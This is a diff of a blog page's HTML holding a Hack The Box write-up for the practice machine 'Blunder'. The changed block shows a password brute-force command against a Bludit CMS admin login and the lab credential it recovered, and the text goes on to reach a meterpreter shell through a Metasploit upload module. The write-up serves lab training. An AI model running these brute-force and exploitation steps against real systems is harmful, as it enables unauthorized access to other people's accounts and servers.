@@ -20,7 +20,7 @@
     <meta property="og:url" content="inesmartins.github.io/htb-write-up-blunder/" />
     <meta property="og:image" content="inesmartins.github.io/content/images/2020/06/infocard.png" />
     <meta property="article:published_time" content="2020-10-22T08:50:44.000Z" />
-    <meta property="article:modified_time" content="2021-09-15T09:32:53.000Z" />
+    <meta property="article:modified_time" content="2021-09-15T09:35:34.000Z" />
     <meta property="article:tag" content="htb" />
     <meta property="article:tag" content="bludit" />
     <meta property="article:tag" content="cms" />
@@ -71,7 +71,7 @@
     "headline": "HTB Write-up  | Blunder",
     "url": "inesmartins.github.io/htb-write-up-blunder/",
     "datePublished": "2020-10-22T08:50:44.000Z",
-    "dateModified": "2021-09-15T09:32:53.000Z",
+    "dateModified": "2021-09-15T09:35:34.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "inesmartins.github.io/content/images/2020/06/infocard.png",
@@ -300,9 +300,10 @@ Description:
 -Remove old users - DONE
 -Inform fergus that the new blog needs images - PENDING
 </code></pre>
-<!--kg-card-end: markdown--><p>So, some interesting new information:</p><ul><li>there is an <code>FTP</code> service configured on this machine;</li><li>there is someone named <code>fergus</code> that might correspond to a user name;</li></ul><p>So, again we try to brute-force the password but now for the user <code>fergus</code>.</p><!--kg-card-begin: markdown--><pre><code>$ python3 bludit-bruteforce.py
+<!--kg-card-end: markdown--><p>So, some interesting new information:</p><ul><li>there is an <code>FTP</code> service configured on this machine;</li><li>there is someone named <code>fergus</code> that might correspond to a user name;</li></ul><p>So, again we try to brute-force the password but now for the user <code>fergus</code>.</p><!--kg-card-begin: markdown--><pre><code>$ python3 bludit-auth-bruteforce.py -host 'http://blunder.htb' -loginpath '/admin/login' -username 'fergus' -passwordfile 'blunder-wordlist.txt'
+
 ...
-SUCCESS: Password found!
+Password found!
 Use fergus:RolandDeschain to login.
 </code></pre>
 <!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>Now that we have valid credentials for <code>fergus</code>, we can test the <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> we found previously. After changing the payload, we're in!</p><pre><code>meterpreter &gt; getuid
